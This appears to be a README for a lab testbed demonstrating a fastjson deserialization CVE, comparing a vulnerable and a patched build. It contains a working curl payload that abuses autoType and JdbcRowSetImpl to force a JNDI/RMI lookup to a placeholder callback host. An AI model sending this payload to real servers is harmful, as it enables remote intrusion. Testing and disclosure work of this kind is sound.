# CVE-2025-70974

Testbed is in fastjson-playground.
```
cd fastjson-playground
docker-compose up
```

## Building the JARs (already done)
First set the version in pom.xml (1.2.83 for safe and 1.2.45 for vuln):
```
    <dependency>
      <groupId>com.alibaba</groupId>
      <artifactId>fastjson</artifactId>
      <version>1.2.83</version>
    </dependency>
```
Then build and move the JARs.
```
mvn clean package
mv target/fastjson-playground-1.0.jar fastjson-playground-safe.jar
```


## Proof of concept for vulnerable instance:
```
curl -X POST http://localhost:8081/ \
  -H "Content-Type: application/json" \
  -d '{
    "a": {
      "@type": "java.lang.Class",
      "val": "com.sun.rowset.JdbcRowSetImpl"
    },
    "b": {
      "@type": "com.sun.rowset.JdbcRowSetImpl",
      "dataSourceName": "rmi://<callback_url>/NoObjectHere",
      "autoCommit": true
    }
  }'
```
Response hangs, DNS request received.


## Proof of concept for safe instance:
```
curl -X POST http://localhost:8082/ \
  -H "Content-Type: application/json" \
  -d '{
    "a": {
      "@type": "java.lang.Class",
      "val": "com.sun.rowset.JdbcRowSetImpl"
    },
    "b": {
      "@type": "com.sun.rowset.JdbcRowSetImpl",
      "dataSourceName": "rmi://<callback_url>/NoObjectHere",
      "autoCommit": true
    }
  }'
```
Response:
```
{
	"timestamp":1769092268366,
	"status":400,
	"error":"Bad Request",
	"exception":"org.springframework.http.converter.HttpMessageNotReadableException",
	"message":"JSON parse error: autoType is not support. com.sun.rowset.JdbcRowSetImpl; nested exception is com.alibaba.fastjson.JSONException: autoType is not support. com.sun.rowset.JdbcRowSetImpl",
	"path":"/"
}
```
